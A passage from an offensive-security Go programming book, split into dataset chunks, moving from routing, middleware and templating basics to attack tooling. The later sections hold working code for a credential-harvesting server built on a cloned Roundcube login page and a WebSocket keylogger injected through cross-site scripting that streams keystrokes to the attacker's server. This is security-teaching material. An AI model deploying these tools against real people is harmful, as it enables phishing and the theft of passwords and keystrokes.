(/ch-4/simple_router/main.go)\nFirst, you define a new type named router without any fields\n❶. You’ll use this to implement the http.Handler interface. To do\nthis, you must define the ServeHTTP() method ❷. The method\nuses a switch statement on the request’s URL path ❸, executing\ndifferent logic depending on the path. It uses a default 404 Not\nFound response action. In main(), you create a new router and pass\nits respective pointer to http.ListenAndServe() ❹.\nLet’s take this for a spin in the ole terminal:\n$ curl http://localhost:8000/a\nExecuting /a\n$ curl http://localhost:8000/d\n404 Not Found\nEverything works as expected; the program returns the\nmessage Executing /a for a URL that contains the /a path, and it\nreturns a 404 response on a path that doesn’t exist. This is a\ntrivial example. The third-party routers that you’ll use will\nhave much more complex logic, but this should give you a\nbasic idea of how they work.\nBuilding Simple Middleware\nNow let’s build middleware, which is a sort of wrapper that\nwill execute on all incoming requests regardless of the\ndestination function. In the example in Listing 4-3, you’ll\ncreate a logger that displays the request’s processing start and\nstop time.\nPackage main\nimport (\n\"fmt\"\n\"log\"\n\"net/http\"\n\"time\"\n)\n❶ type logger struct {\nInner http.Handler\n}\n❷ func (l *logger) ServeHTTP(w http.ResponseWriter, r *http.Request) {\nlog.Println(\"start\")\n❸ l.Inner.ServeHTTP(w, r)\nlog.Println(\"finish\")\n}\nfunc hello(w http.ResponseWriter, r *http.Request) {\nfmt.Fprint(w, \"Hello\\n\")\n}\nfunc main() {\n❹ f := http.HandlerFunc(hello)\n❺ l := logger{Inner: f}\n❻ http.ListenAndServe(\":8000\", &l)\n}\nListing 4-3: Simple middleware (/ch-4/simple_middleware/main.go)\nWhat you’re essentially doing is creating an outer handler\nthat, on every request, logs some information on the server and\ncalls your hello() function. You wrap this logging logic around\nyour function.\nAs with the routing example, you define a new type named\nlogger, but this time you have a field, Inner, which is an http.Handler\nitself ❶. In your ServeHTTP() definition ❷, you use log() to print\nthe start and finish times of the request, calling the inner\nhandler’s ServeHTTP() method in between ❸. To the client, the\nrequest will finish inside the inner handler. Inside main(), you\nuse http.HandlerFunc() to create an http.Handler out of a function ❹.\nYou create the logger, setting Inner to your newly created handler\n❺. Finally, you start the server by using a pointer to a logger\ninstance ❻.\nRunning this and issuing a request outputs two messages\ncontaining the start and finish times of the request:\n$ go build -o simple_middleware\nHivaNetwork.Com\n$ ./simple_middleware\n2020/01/16 06:23:14 start\n2020/01/16 06:23:14 finish\nIn the following sections, we’ll dig deeper into middleware\nand routing and use some of our favorite third-party packages,\nwhich let you create more dynamic routes and execute\nmiddleware inside a chain. We’ll also discuss some use cases\nfor middleware that move into more complex scenarios.\nRouting with the gorilla/mux Package\nAs shown in Listing 4-2, you can use routing to match a\nrequest’s path to a function. But you can also use it to match\nother properties—such as the HTTP verb or host header—to a\nfunction. Several third-party routers are available in the Go\necosystem. Here, we’ll introduce you to one of them: the\ngorilla/mux package. But just as with everything, we encourage\nyou to expand your knowledge by researching additional\npackages as you encounter them.\nThe gorilla/mux package is a mature, third-party routing\npackage that allows you to route based on both simple and\ncomplex patterns. It includes regular expressions, parameter\nmatching, verb matching, and sub routing, among other\nfeatures.\nLet’s go over a few examples of how you might use the\nrouter. There is no need to run these, as you’ll be using them\nin a real program soon, but please feel free to play around and\nexperiment.\nBefore you can use gorilla/mux, you must go get it:\n$ go get github.com/gorilla/mux\nNow, you can start routing. Create your router by using\nmux.NewRouter():\nr := mux.NewRouter()\nThe returned type implements http.Handler but has a host of\nother associated methods as well. The one you’ll use most\noften is HandleFunc(). For example, if you wanted to define a\nnew route to handle GET requests to the pattern /foo, you could\nuse this:\nr.HandleFunc(\"/foo\", func(w http.ResponseWriter, req *http.Request) {\nfmt.Fprint(w, \"hi foo\")\n}).Methods(\"GET\")❶\nNow, because of the call to Methods() ❶, only GET requests\nwill match this route. All other methods will return a 404\nresponse. You can chain other qualifiers on top of this, such as\nHost(string), which matches a particular host header value. For\nexample, the following will match only requests whose host\nheader is set to www.foo.com:\nr.HandleFunc(\"/foo\", func(w http.ResponseWriter, req *http.Request) {\nfmt.Fprint(w, \"hi foo\")\n}).Methods(\"GET\").Host(\"www.foo.com\")\nSometimes it’s helpful to match and pass in parameters\nwithin the request path (for example, when implementing a\nRESTful API). This is simple with gorilla/mux. The following\nwill print out anything following /users/ in the request’s path:\nr.HandleFunc(\"/users/{user}\", func(w http.ResponseWriter, req *http.Request) {\nuser := mux.Vars(req)[\"user\"]\nfmt.Fprintf(w, \"hi %s\\n\", user)\n}).Methods(\"GET\")\n}).Methods(\"GET\")\nIn the path definition, you use braces to define a request\nparameter. Think of this as a named placeholder. Then, inside\nthe handler function, you call mux.Vars(), passing it the request\nobject, which returns a map[string]string—a map of request\nparameter names to their respective values. You provide the\nnamed placeholder user as the key. So, a request to /users/bob\nshould produce a greeting for Bob:\n$ curl http://localhost:8000/users/bob\nhi bob\nYou can take this a step further and use a regular\nexpression to qualify the patterns passed. For example, you\ncan specify that the user parameter must be lowercase letters:\nr.HandleFunc(\"/users/{user:[a-z]+}\", func(w http.ResponseWriter, req\n*http.Request) {\nuser := mux.Vars(req)[\"user\"]\nfmt.Fprintf(w, \"hi %s\\n\", user)\n}).Methods(\"GET\")\nAny requests that don’t match this pattern will now return a\n404 response:\n$ curl -i http://localhost:8000/users/bob1\nHTTP/1.1 404 Not Found\nIn the next section, we’ll expand on routing to include\nsome middleware implementations using other libraries. This\nwill give you increased flexibility with handling HTTP\nrequests.\nBuilding Middleware with Negroni\nThe simple middleware we showed earlier logged the start and\nend times of the handling of the request and returned the\nresponse. Middleware doesn’t have to operate on every\nincoming request, but most of the time that will be the case.\nThere are many reasons to use middleware, including logging\nrequests, authenticating and authorizing users, and mapping\nresources.\nFor example, you could write middleware for performing\nbasic authentication. It could parse an authorization header for\neach request, validate the username and password provided,\nand return a 401 response if the credentials are invalid. You\ncould also chain multiple middleware functions together in\nsuch a way that after one is executed, the next one defined is\nrun.\nFor the logging middleware you created earlier in this\nchapter, you wrapped only a single function. In practice, this is\nnot very useful, because you’ll want to use more than one, and\nto do this, you must have logic that can execute them in a\nchain, one after another. Writing this from scratch is not\nincredibly difficult, but let’s not re-create the wheel. Here,\nyou’ll use a mature package that is already able to do this:\nnegroni.\nThe negroni package, which you can find at\nhttps://github.com/urfave/negroni/, is great because it doesn’t\ntie you into a larger framework. You can easily bolt it onto\nother frameworks, and it provides a lot of flexibility. It also\ncomes with default middleware that is useful for many\napplications. Before you hop in, you need to go get negroni:\n$ go get github.com/urfave/negroni\nWhile you technically could use negroni for all application\nlogic, doing this is far from ideal because it’s purpose-built to\nact as middleware and doesn’t include a router. Instead, it’s\nbest to use negroni in combination with another package, such as\ngorilla/mux or net/http. Let’s use gorilla/mux to build a program that\nwill get you acquainted with negroni and allow you to visualize\nthe order of operations as they traverse the middleware chain.\nStart by creating a new file called main.go within a\ndirectory namespace, such as github.com/blackhat-go/bhg/ch-\n4/negroni_example/. (This namespace will already be created\nin the event you cloned the BHG Github repository.) Now\nmodify your main.go file to include the following code.\npackage main\nimport (\n\"net/http\"\n\"github.com/gorilla/mux\"\n\"github.com/urfave/negroni\"\n)\nfunc main() {\n❶ r := mux.NewRouter()\n❷ n := negroni.Classic()\n❸ n.UseHandler(r)\nhttp.ListenAndServe(\":8000\", n)\n}\nListing 4-4: Negroni example (/ch-4/negroni_example/main.go)\nFirst, you create a router as you did earlier in this chapter\nby calling mux.NewRouter() ❶. Next comes your first interaction\nwith the negroni package: you make a call to negroni.Classic() ❷.\nThis creates a new pointer to a Negroni instance.\nThere are different ways to do this. You can either use\nnegroni.Classic() or call negroni.New(). The first, negroni.Classic(), sets\nup default middleware, including a request logger, recovery\nmiddleware that will intercept and recover from panics, and\nmiddleware that will serve files from the public folder in the\nsame directory. The negroni.New() function doesn’t create any\ndefault middleware.\nEach type of middleware is available in the negroni package.\nFor example, you can use the recovery package by doing the\nfollowing:\nn.Use(negroni.NewRecovery())\nNext, you add your router to the middleware stack by\ncalling n.UseHandler(r) ❸. As you continue to plan and build out\nyour middleware, consider the order of execution. For\nexample, you’ll want your authentication-checking\nmiddleware to run prior to the handler functions that require\nauthentication. Any middleware mounted before the router\nwill execute prior to your handler functions; any middleware\nmounted after the router will execute after your handler\nfunctions. Order matters. In this case, you haven’t defined any\ncustom middleware, but you will soon.\nGo ahead and build the server you created in Listing 4-4,\nand then execute it. Then issue web requests to the server at\nhttp://localhost:8000. You should see the negroni logging\nmiddleware print information to stdout, as shown next. The\noutput shows the timestamp, response code, processing time,\nhost, and HTTP method:\n$ go build -s negroni_example\n$ ./negroni_example\n[negroni] 2020-01-19T11:49:33-07:00 | 404 | 1.0002ms | localhost:8000 | GET\nHaving default middleware is great and all, but the real\npower comes when you create your own. With negroni, you can\nuse a few methods to add middleware to the stack. Take a look\nat the following code. It creates trivial middleware that prints a\nmessage and passes execution to the next middleware in the\nchain:\ntype trivial struct {\n}\nfunc (t *trivial) ServeHTTP(w http.ResponseWriter, r *http.Request, next\nhttp.HandlerFunc) { ❶\nfmt.Println(\"Executing trivial middleware\")\nnext(w, r) ❷\n}\nThis implementation is slightly different from previous\nexamples. Before, you were implementing the http.Handler\ninterface, which expected a ServeHTTP() method that accepted\ntwo parameters: http.ResponseWriter and *http.Request. In this new\nexample, instead of the http.Handler interface, you’re\nimplementing the negroni.Handler interface.\nThe slight difference is that the negroni.Handler interface\nexpects you to implement a ServeHTTP() method that accepts not\ntwo, but three, parameters: http.ResponseWriter, *http.Request, and\nhttp.HandlerFunc ❶. The http.HandlerFunc parameter represents the\nnext middleware function in the chain. For your purposes, you\nname it next. You do your processing within ServeHTTP(), and\nthen call next() ❷, passing it the http.ResponseWriter and *http.Request\nvalues you originally received. This effectively transfers\nexecution down the chain.\nBut you still have to tell negroni to use your implementation\nas part of the middleware chain. You can do this by calling\nnegroni’s Use method and passing an instance of your\nnegroni.Handler implementation to it:\nn.Use(&trivial{})\nWriting your middleware by using this method is\nconvenient because you can easily pass execution to the next\nmiddleware. There is one drawback: anything you write must\nuse negroni. For example, if you were writing a middleware\npackage that writes security headers to a response, you would\nwant it to implement http.Handler, so you could use it in other\napplication stacks, since most stacks won’t expect a\nnegroni.Handler. The point is, regardless of your middleware’s\npurpose, compatibility issues may arise when trying to use\nnegroni middleware in a non-negroni stack, and vice versa.\nThere are two other ways to tell negroni to use your\nmiddleware. UseHandler(handler http.Handler), which you’re already\nfamiliar with, is the first. The second way is to call\nUseHandleFunc(handlerFunc func(w http.ResponseWriter, r *http.Request)). The\nlatter is not something you’ll want to use often, since it doesn’t\nlet you forgo execution of the next middleware in the chain.\nFor example, if you were writing middleware to perform\nauthentication, you would want to return a 401 response and\nstop execution if any credentials or session information were\ninvalid; with this method, there’s no way to do that.\nAdding Authentication with Negroni\nBefore moving on, let’s modify our example from the previous\nsection to demonstrate the use of context, which can easily pass\nvariables between functions. The example in Listing 4-5 uses\nnegroni to add authentication middleware.\npackage main\nimport (\n\"context\"\n\"fmt\"\n\"net/http\"\n\"github.com/gorilla/mux\"\n\"github.com/urfave/negroni\"\n)\ntype badAuth struct { ❶\nUsername string\nPassword string\n}\nfunc (b *badAuth) ServeHTTP(w http.ResponseWriter, r *http.Request, next\nhttp.HandlerFunc) { ❷\nusername := r.URL.Query().Get(\"username\") ❸\npassword := r.URL.Query().Get(\"password\")\nif username != b.Username || password != b.Password {\nhttp.Error(w, \"Unauthorized\", 401)\nreturn ❹\n}\nctx := context.WithValue(r.Context(), \"username\", username) ❺\nr = r.WithContext(ctx) ❻\nnext(w, r)\n}\nfunc hello(w http.ResponseWriter, r *http.Request) {\nusername := r.Context().Value(\"username\").(string) ❼\nfmt.Fprintf(w, \"Hi %s\\n\", username)\n}\nfunc main() {\nr := mux.NewRouter()\nr.HandleFunc(\"/hello\", hello).Methods(\"GET\")\nn := negroni.Classic()\nn.Use(&badAuth{\nUsername: \"admin\",\nPassword: \"password\",\n})\nn.UseHandler(r)\nhttp.ListenAndServe(\":8000\", n)\n}\nListing 4-5: Using context in handlers (/ch-4/negroni_example/main.go)\nYou’ve added new middleware, badAuth, that is going to\nsimulate authentication, purely for demonstration purposes ❶.\nThis new type has two fields, Username and Password, and\nimplements negroni.Handler, since it defines the three-parameter\nversion of the ServeHTTP() method ❷ we discussed previously.\nInside the ServeHTTP() method, you first grab the username and\npassword from the request ❸, and then compare them to the\nfields you have. If the username and password are incorrect,\nexecution is stopped, and a 401 response is written to the\nrequester.\nNotice that you return ❹ before calling next(). This prevents\nthe remainder of the middleware chain from executing. If the\ncredentials are correct, you go through a rather verbose routine\nof adding the username to the request context. You first call\ncontext.WithValue() to initialize the context from the request,\nsetting a variable named username on that context ❺. You then\nmake sure the request uses your new context by calling\nr.WithContext(ctx) ❻. If you plan on writing web applications\nwith Go, you’ll want to become familiar with this pattern, as\nHivaNetwork.Com\nyou’ll be using it a lot.\nIn the hello() function, you get the username from the\nrequest context by using the Context().Value(interface{}) function,\nwhich itself returns an interface{}. Because you know it’s a\nstring, you can use a type assertion here ❼. If you can’t\nguarantee the type, or you can’t guarantee that the value will\nexist in the context, use a switch routine for conversion.\nBuild and execute the code from Listing 4-5 and send a few\nrequests to the server. Send some with both correct and\nincorrect credentials. You should see the following output:\n$ curl -i http://localhost:8000/hello\nHTTP/1.1 401 Unauthorized\nContent-Type: text/plain; charset=utf-8\nX-Content-Type-Options: nosniff\nDate: Thu, 16 Jan 2020 20:41:20 GMT\nContent-Length: 13\nUnauthorized\n$ curl -i 'http://localhost:8000/hello?username=admin&password=password'\nHTTP/1.1 200 OK\nDate: Thu, 16 Jan 2020 20:41:05 GMT\nContent-Length: 9\nContent-Type: text/plain; charset=utf-8\nHi admin\nMaking a request without credentials results in your\nmiddleware returning a 401 Unauthorized error. Sending the\nsame request with a valid set of credentials produces a super-\nsecret greeting message accessible only to authenticated users.\nThat was an awful lot to digest. Up to this point, your\nhandler functions have solely used fmt.FPrintf() to write your\nresponse to the http.ResponseWriter instance. In the next section,\nyou’ll look at a more dynamic way of returning HTML by\nusing Go’s templating package.\nUsing Templates to Produce HTML Responses\nTemplates allow you to dynamically generate content,\nincluding HTML, with variables from Go programs. Many\nlanguages have third-party packages that allow you to generate\ntemplates. Go has two templating packages, text/template and\nhtml/template. In this chapter, you’ll use the HTML package,\nbecause it provides the contextual encoding you need.\nOne of the fantastic things about Go’s package is that it’s\ncontextually aware: it will encode your variable differently\ndepending on where the variable is placed in the template. For\nexample, if you were to supply a string as a URL to an href\nattribute, the string would be URL encoded, but the same\nstring would be HTML encoded if it rendered within an\nHTML element.\nTo create and use templates, you first define your template,\nwhich contains a placeholder to denote the dynamic contextual\ndata to render. Its syntax should look familiar to readers who\nhave used Jinja with Python. When you render the template,\nyou pass to it a variable that’ll be used as this context. The\nvariable can be a complex structure with several fields, or it\ncan be a primitive variable.\nLet’s work through a sample, shown in Listing 4-6, that\ncreates a simple template and populates a placeholder with\nJavaScript. This is a contrived example that shows how to\ndynamically populate content returned to the browser.\npackage main\nimport (\n\"html/template\"\n\"os\"\n)\n❶ var x = `\n<html>\n<body>\n❷ Hello {{.}}\n</body>\n</html>\n`\nfunc main() {\n❸ t, err := template.New(\"hello\").Parse(x)\nif err != nil {\npanic(err)\n}\n❹ t.Execute(os.Stdout, \"<script>alert('world')</script>\")\n}\nListing 4-6: HTML templating (/ch-4/template_example/main.go)\nThe first thing you do is create a variable, named x, to store\nyour HTML template ❶. Here you’re using a string embedded\nin your code to define your template, but most of the time\nyou’ll want to store your templates as separate files. Notice\nthat the template is nothing more than a simple HTML page.\nInside the template, you define placeholders by using the\n{{variable-name}} convention, where variable-name is the data\nelement within your contextual data that you’ll want to render\n❷. Recall that this can be a struct or another primitive. In this\ncase, you’re using a single period, which tells the package that\nyou want to render the entire context here. Since you’ll be\nworking with a single string, this is fine, but if you had a larger\nand more complex data structure, such as a struct, you could\nget only the fields you want by calling past this period. For\nexample, if you passed a struct with a Username field to the\ntemplate, you could render the field by using {{.Username}}.\nNext, in your main() function, you create a new template by\ncalling template.New(string) ❸. Then you call Parse(string) to ensure\nthat the template is properly formatted and to parse it.\nTogether, these two functions return a new pointer to a\nTemplate.\nWhile this example uses only a single template, it’s\npossible to embed templates in other templates. When using\nmultiple templates, it’s important that you name them in order\nto be able to call them. Finally, you call Execute(io.Writer,\ninterface{}) ❹, which processes the template by using the\nvariable passed as the second argument and writes it to the\nprovided io.Writer. For demonstration purposes, you’ll use\nos.Stdout. The second variable you pass into the Execute() method\nis the context that’ll be used for rendering the template.\nRunning this produces HTML, and you should notice that\nthe script tags and other nefarious characters that were\nprovided as part of your context are properly encoded. Neat-o!\n$ go build -o template_example\n$ ./template_example\n<html>\n<body>\nHello &lt;script&gt;alert(&#39;world&#39;)&lt;/script&gt;\n</body>\n</html>\nWe could say a lot more about templates. You can use"
  },
  {
    "input": "Credential Harvesting",
    "output": "logical operators with them; you can use them with loops and\nother control structures. You can call built-in functions, and\nyou can even define and expose arbitrary helper functions to\ngreatly expand the templating capabilities. Double neat-o! We\nrecommend you dive in and research these possibilities.\nThey’re beyond the scope of this book, but are powerful.\nHow about you step away from the basics of creating\nservers and handling requests and instead focus on something\nmore nefarious. Let’s create a credential harvester!\nCREDENTIAL HARVESTING\nOne of the staples of social engineering is the credential-\nharvesting attack. This type of attack captures users’ login\ninformation to specific websites by getting them to enter their\ncredentials in a cloned version of the original site. The attack\nis useful against organizations that expose a single-factor\nauthentication interface to the internet. Once you have a user’s\ncredentials, you can use them to access their account on the\nactual site. This often leads to an initial breach of the\norganization’s perimeter network.\nGo provides a great platform for this type of attack,\nbecause it’s quick to stand up new servers, and because it\nmakes it easy to configure routing and to parse user-supplied\ninput. You could add many customizations and features to a\ncredential-harvesting server, but for this example, let’s stick to\nthe basics.\nTo begin, you need to clone a site that has a login form.\nThere are a lot of possibilities here. In practice, you’d\nprobably want to clone a site in use by the target. For this\nexample, though, you’ll clone a Roundcube site. Roundcube is\nan open source webmail client that’s not used as often as\ncommercial software, such as Microsoft Exchange, but will\nallow us to illustrate the concepts just as well. You’ll use\nDocker to run Roundcube, because it makes the process easier.\nYou can start a Roundcube server of your own by\nexecuting the following. If you don’t want to run a Roundcube\nserver, then no worries; the exercise source code has a clone of\nthe site. Still, we’re including this for completeness:\n$ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube\nThe command starts a Roundcube Docker instance. If you\nnavigate to http://127.0.0.1:80, you’ll be presented with a\nlogin form. Normally, you’d use wget to clone a site and all its\nrequisite files, but Roundcube has JavaScript awesomeness\nthat prevents this from working. Instead, you’ll use Google\nChrome to save it. In the exercise folder, you should see a\ndirectory structure that looks like Listing 4-7.\n$ tree\n.\n+-- main.go\n+-- public\n+-- index.html\n+-- index_files\n+-- app.js\n+-- common.js\n+-- jquery-ui-1.10.4.custom.css\n+-- jquery-ui-1.10.4.custom.min.js\n+-- jquery.min.js\n+-- jstz.min.js\n+-- roundcube_logo.png\n+-- styles.css\n+-- ui.js\nindex.html\nListing 4-7: Directory listing for /ch-4/credential_harvester/\nThe files in the public directory represent the unaltered\ncloned login site. You’ll need to modify the original login\nform to redirect the entered credentials, sending them to\nyourself instead of the legitimate server. To begin, open\npublic/index.html and find the form element used to POST the\nlogin request. It should look something like the following:\n<form name=\"form\" method=\"post\" action=\"http://127.0.0.1/?_task=login\">\nYou need to modify the action attribute of this tag and point\nit to your server. Change action to /login. Don’t forget to save it.\nThe line should now look like the following:\n<form name=\"form\" method=\"post\" action=\"/login\">\nTo render the login form correctly and capture a username\nand password, you’ll first need to serve the files in the public\ndirectory. Then you’ll need to write a HandleFunc for /login to\ncapture the username and password. You’ll also want to store\nthe captured credentials in a file with some verbose logging.\nYou can handle all of this in just a few dozen lines of code.\nListing 4-8 shows the program in its entirety.\npackage main\nimport (\n\"net/http\"\n\"os\"\n\"time\"\nlog \"github.com/Sirupsen/logrus\" ❶\n\"github.com/gorilla/mux\"\n)\nfunc login(w http.ResponseWriter, r *http.Request) {\nlog.WithFields(log.Fields{ ❷\n\"time\": time.Now().String(),\n\"username\": r.FormValue(\"_user\"), ❸\n\"password\": r.FormValue(\"_pass\"), ❹\n\"user-agent\": r.UserAgent(),\n\"ip_address\": r.RemoteAddr,\n}).Info(\"login attempt\")\nhttp.Redirect(w, r, \"/\", 302)\n}\nfunc main() {\nfh, err := os.OpenFile(\"credentials.txt\",\nos.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) ❺\nif err != nil {\npanic(err)\n}\ndefer fh.Close()\nlog.SetOutput(fh) ❻\nr := mux.NewRouter()\nr.HandleFunc(\"/login\", login).Methods(\"POST\") ❼\nr.PathPrefix(\"/\").Handler(http.FileServer(http.Dir(\"public\"))) ❽\nlog.Fatal(http.ListenAndServe(\":8080\", r))\n}\nListing 4-8: Credential-harvesting server (/ch-4/credential_harvester/main.go)\nThe first thing worth noting is you import\ngithub.com/Sirupsen/logrus ❶. This is a structured logging package\nthat we prefer to use instead of the standard Go log package. It\nprovides more configurable logging options for better error\nhandling. To use this package, you’ll need to make sure you\nran go get beforehand.\nNext, you define the login() handler function. Hopefully, this\npattern looks familiar. Inside this function, you use\nlog.WithFields() to write out your captured data ❷. You display\nthe current time, the user-agent, and IP address of the\nrequester. You also call FormValue(string) to capture both the\nusername (_user) ❸ and password (_pass) ❹ values that were\nsubmitted. You get these values from index.html and by\nlocating the form input elements for each username and\npassword. Your server needs to explicitly align with the names\nof the fields as they exist in the login form.\nThe following snippet, extracted from index.html, shows\nthe relevant input items, with the element names in bold for\nclarity:\n<td class=\"input\"><input name=\"_user\" id=\"rcmloginuser\" required=\"required\"\nsize=\"40\" autocapitalize=\"off\" autocomplete=\"off\" type=\"text\"></td>\n<td class=\"input\"><input name=\"_pass\" id=\"rcmloginpwd\" required=\"required\"\nsize=\"40\" autocapitalize=\"off\" autocomplete=\"off\" type=\"password\"></td>\nIn your main() function, you begin by opening a file that’ll\nbe used to store your captured data ❺. Then, you use\nlog.SetOutput(io.Writer), passing it the file handle you just created,\nto configure the logging package so that it’ll write its output to\nthat file ❻. Next, you create a new router and mount the login()\nhandler function ❼.\nPrior to starting the server, you do one more thing that may\nlook unfamiliar: you tell your router to serve static files from a\ndirectory ❽. That way, your Go server explicitly knows where\nyour static files—images, JavaScript, HTML—live. Go makes\nthis easy, and provides protections against directory traversal\nattacks. Starting from the inside out, you use http.Dir(string) to\ndefine the directory from which you wish to serve the files.\nThe result of this is passed as input to http.FileServer(FileSystem),\nwhich creates an http.Handler for your directory. You’ll mount\nthis to your router by using PathPrefix(string). Using / as a path\nprefix will match any request that hasn’t already found a\nmatch. Note that, by default, the handler returned from\nFileServer does support directory indexing. This could leak some\ninformation. It’s possible to disable this, but we won’t cover\nthat here.\nFinally, as you have before, you start the server. Once\nyou’ve built and executed the code in Listing 4-8, open your\nweb browser and navigate to http://localhost:8080. Try\nsubmitting a username and password to the form. Then head\nback to the terminal, exit the program, and view the\ncredentials.txt file, shown here:\n$ go build -o credential_harvester\n$ ./credential_harvester\n^C\n$ cat credentials.txt\nINFO[0038] login attempt\nip_address=\"127.0.0.1:34040\" password=\"p@ssw0rd1!\" time=\"2020-02-13\n21:29:37.048572849 -0800 PST\" user-agent=\"Mozilla/5.0 (X11; Ubuntu; Linux\nx86_64;\nrv:51.0) Gecko/20100101 Firefox/51.0\" username=bob\nLook at those logs! You can see that you submitted the\nusername of bob and the password of p@ssw0rd1!. Your\nmalicious server successfully handled the form POST request,\ncaptured the entered credentials, and saved them to a file for\noffline viewing. As an attacker, you could then attempt to use\nthese credentials against the target organization and proceed\nwith further compromise.\nIn the next section, you’ll work through a variation of this\ncredential-harvesting technique. Instead of waiting for form\nHivaNetwork.Com"
  },
  {
    "input": "Keylogging with the WebSocket API",
    "output": "submission, you’ll create a keylogger to capture keystrokes in\nreal time.\nKEYLOGGING WITH THE\nWEBSOCKET API\nThe WebSocket API (WebSockets), a full duplex protocol, has\nincreased in popularity over the years and many browsers now\nsupport it. It provides a way for web application servers and\nclients to efficiently communicate with each other. Most\nimportantly, it allows the server to send messages to a client\nwithout the need for polling.\nWebSockets are useful for building “real-time”\napplications, such as chat and games, but you can use them for\nnefarious purposes as well, such as injecting a keylogger into\nan application to capture every key a user presses. To begin,\nimagine you’ve identified an application that is vulnerable to\ncross-site scripting (a flaw through which a third party can run\narbitrary JavaScript in a victim’s browser) or you’ve\ncompromised a web server, allowing you to modify the\napplication source code. Either scenario should let you include\na remote JavaScript file. You’ll build the server infrastructure\nto handle a WebSocket connection from a client and handle\nincoming keystrokes.\nFor demonstration purposes, you’ll use JS Bin\n(http://jsbin.com) to test your payload. JS Bin is an online\nplayground where developers can test their HTML and\nJavaScript code. Navigate to JS Bin in your web browser and\npaste the following HTML into the column on the left,\ncompletely replacing the default code:\n<!DOCTYPE html>\n<html>\n<head>\n<title>Login</title>\n</head>\n<body>\n<script src='http://localhost:8080/k.js'></script>\n<form action='/login' method='post'>\n<input name='username'/>\n<input name='password'/>\n<input type=\"submit\"/>\n</form>\n</body>\n</html>\nOn the right side of the screen, you’ll see the rendered\nform. As you may have noticed, you’ve included a script tag\nwith the src attribute set to http://localhost:8080/k.js. This is going to\nbe the JavaScript code that will create the WebSocket\nconnection and send user input to the server.\nYour server is going to need to do two things: handle the\nWebSocket and serve the JavaScript file. First, let’s get the\nJavaScript out of the way, since after all, this book is about\nGo, not JavaScript. (Check out\nhttps://github.com/gopherjs/gopherjs/ for instructions on\nwriting JavaScript with Go.) The JavaScript code is shown\nhere:\n(function() {\nvar conn = new WebSocket(\"ws://{{.}}/ws\");\ndocument.onkeypress = keypress;\nfunction keypress(evt) {\ns = String.fromCharCode(evt.which);\nconn.send(s);\n}\n})();\nThe JavaScript code handles keypress events. Each time a\nkey is pressed, the code sends the keystrokes over a\nWebSocket to a resource at ws://{{.}}/ws. Recall that the {{.}}\nvalue is a Go template placeholder representing the current\ncontext. This resource represents a WebSocket URL that will\npopulate the server location information based on a string\nyou’ll pass to the template. We’ll get to that in a minute. For\nthis example, you’ll save the JavaScript in a file named\nlogger.js.\nBut wait, you say, we said we were serving it as k.js! The\nHTML we showed previously also explicitly uses k.js. What\ngives? Well, logger.js is a Go template, not an actual\nJavaScript file. You’ll use k.js as your pattern to match against\nin your router. When it matches, your server will render the\ntemplate stored in the logger.js file, complete with contextual\ndata that represents the host to which your WebSocket\nconnects. You can see how this works by looking at the server\ncode, shown in Listing 4-9.\nimport (\n\"flag\"\n\"fmt\"\n\"html/template\"\n\"log\"\n\"net/http\"\n\"github.com/gorilla/mux\"\n❶ \"github.com/gorilla/websocket\"\n)\nvar (\n❷ upgrader = websocket.Upgrader{\nCheckOrigin: func(r *http.Request) bool { return true },\n}\nlistenAddr string\nwsAddr string\njsTemplate *template.Template\n)\nfunc init() {\nflag.StringVar(&listenAddr, \"listen-addr\", \"\", \"Address to listen on\")\nflag.StringVar(&wsAddr, \"ws-addr\", \"\", \"Address for WebSocket connection\")\nflag.Parse()\nvar err error\n❸ jsTemplate, err = template.ParseFiles(\"logger.js\")\nif err != nil {\npanic(err)\n}\n}\nfunc serveWS(w http.ResponseWriter, r *http.Request) {\n❹ conn, err := upgrader.Upgrade(w, r, nil)\nif err != nil {\nhttp.Error(w, \"\", 500)\nreturn\n}\ndefer conn.Close()\nfmt.Printf(\"Connection from %s\\n\", conn.RemoteAddr().String())\nfor {\n❺ _, msg, err := conn.ReadMessage()\nif err != nil {\nreturn\n}\n❻ fmt.Printf(\"From %s: %s\\n\", conn.RemoteAddr().String(), string(msg))\n}\n}\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n❼ w.Header().Set(\"Content-Type\", \"application/javascript\")\n❽ jsTemplate.Execute(w, wsAddr)\n}\nfunc main() {\nr := mux.NewRouter()\n❾ r.HandleFunc(\"/ws\", serveWS)\n❿ r.HandleFunc(\"/k.js\", serveFile)\nlog.Fatal(http.ListenAndServe(\":8080\", r))\n}\nListing 4-9: Keylogging server (/ch-4/websocket_keylogger/main.go)\nWe have a lot to cover here. First, note that you’re using\nanother third-party package, gorilla/websocket, to handle your\nWebSocket communications ❶. This is a full-featured,\npowerful package that simplifies your development process,\nlike the gorilla/mux router you used earlier in this chapter. Don’t\nforget to run go get github.com/gorilla/websocket from your terminal\nfirst.\nYou then define several variables. You create a\nwebsocket.Upgrader instance that’ll essentially whitelist every\norigin ❷. It’s typically bad security practice to allow all\norigins, but in this case, we’ll roll with it since this is a test\ninstance we’ll run on our local workstations. For use in an\nactual malicious deployment, you’d likely want to limit the\norigin to an explicit value.\nWithin your init() function, which executes automatically\nbefore main(), you define your command line arguments and\nattempt to parse your Go template stored in the logger.js file.\nNotice that you’re calling template.ParseFiles(\"logger.js\") ❸. You\ncheck the response to make sure the file parsed correctly. If all\nis successful, you have your parsed template stored in a\nvariable named jsTemplate.\nAt this point, you haven’t provided any contextual data to\nyour template or executed it. That’ll happen shortly. First,\nhowever, you define a function named serveWS() that you’ll use\nto handle your WebSocket communications. You create a new\nwebsocket.Conn instance by calling upgrader.Upgrade(http.ResponseWriter,\n*http.Request, http.Header) ❹. The Upgrade() method upgrades the\nHTTP connection to use the WebSocket protocol. That means\nthat any request handled by this function will be upgraded to\nuse WebSockets. You interact with the connection within an\ninfinite for loop, calling conn.ReadMessage() to read incoming\nmessages ❺. If your JavaScript works appropriately, these\nmessages should consist of captured keystrokes. You write\nthese messages and the client’s remote IP address to stdout ❻.\nYou’ve tackled arguably the hardest piece of the puzzle in\ncreating your WebSocket handler. Next, you create another\nhandler function named serveFile(). This function will retrieve\nand return the contents of your JavaScript template, complete\nwith contextual data included. To do this, you set the Content-\nType header as application/javascript ❼. This will tell connecting\nbrowsers that the contents of the HTTP response body should\nbe treated as JavaScript. In the second and last line of the\nhandler function, you call jsTemplate.Execute(w, wsAddr) ❽.\nRemember how you parsed logger.js while you were\nbootstrapping your server in the init() function? You stored the\nresult 